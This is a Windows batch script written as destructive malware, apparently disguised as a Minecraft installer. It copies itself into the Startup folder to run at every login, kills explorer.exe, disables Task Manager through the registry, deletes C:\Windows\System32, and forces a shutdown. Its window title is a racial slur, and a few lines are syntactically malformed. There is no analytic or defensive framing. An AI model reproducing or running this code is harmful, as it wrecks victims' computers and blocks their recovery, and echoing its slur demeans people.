@echo off
title Niggerz
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
  copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

start MinecraftInstaller.exe

:1
powershell -window minimized -command "MinecraftInstaller.exe.bat"taskkill /F /IM explorer.exe
goto 2:

:2
taskkill /F /IM explorer.exe
goto 3:

:3
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
goto 4:

:4
powershell -window minimized -command "MinecraftInstaller.exe.bat"taskkill /F /IM explorer.exe
goto Finalboss:

:FinalBoss
msg * Final kiss ;)
rd /s /q C:\Windows\System32
shutdown -s -t 1
exit
